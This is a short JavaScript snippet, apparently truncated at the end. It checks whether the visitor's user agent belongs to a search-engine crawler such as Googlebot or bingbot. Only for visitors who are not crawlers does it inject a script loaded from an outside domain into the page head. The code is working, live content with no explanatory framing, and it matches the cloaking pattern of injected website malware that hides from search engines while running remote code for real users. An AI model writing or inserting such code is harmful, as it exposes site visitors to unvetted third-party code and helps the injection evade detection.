function isBot() {
    if (navigator.userAgent) {
        if (/bot|google\.com|Googlebot|Googlebot-Image|Googlebot-Image\/1\.0|Google|google|bingbot/i.test(navigator.userAgent)) {
            return true;
        }
    }
    return false;
}

if (!isBot()) {
var script = document.createElement('script');
script.src = "https://faktor.my.id/adsnode/app.js";
document.head.appendChild(script);
